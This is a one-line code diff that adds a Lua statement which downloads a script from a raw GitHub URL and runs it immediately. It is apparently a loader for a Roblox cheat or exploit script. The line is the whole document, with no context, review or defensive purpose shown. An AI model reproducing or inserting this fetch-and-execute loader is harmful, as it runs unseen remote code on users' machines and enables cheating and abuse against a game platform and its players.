@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/flame-eye-crazy-skeleton-rng-spam2-hee5hbixo6312d.lua"))()
